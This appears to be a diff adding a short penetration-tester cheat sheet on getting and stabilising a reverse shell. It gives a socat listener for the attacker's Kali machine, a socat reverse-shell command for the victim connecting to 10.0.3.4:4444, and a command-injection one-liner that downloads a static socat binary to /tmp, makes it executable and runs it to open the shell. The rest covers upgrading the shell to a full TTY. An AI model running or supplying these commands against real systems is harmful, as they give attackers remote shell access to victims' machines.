@@ -1,0 +1,37 @@
+socat:
+
+On Kali (listen):
+
+socat file:'tty',raw,echo=0 tcp-listen:4444  
+
+On Victim (launch):
+
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+
+standalone binaries
+https://github.com/andrew-d/static-binaries
+
+command injection:
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
+
+download to writable directory , chmod it and execute it.
+
+--------------------------------------------------------------------------------------------------------------
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl+z (will background the current connection)
+
+#here we can also check <echo $TERM> to see the xterm-256 color response.
+#we can also do <stty -a> for options.
+
+stty raw -echo (to enable printing the keys as they are pressed)
+fg (to bring back the shell to foreground)
+reset (to fix the formatting and reinitialize the terminal)
+
+export TERM=xterm (to enable clear screen option)
+----------------------------------------------------------------------------------------------------------------------
+
+
+
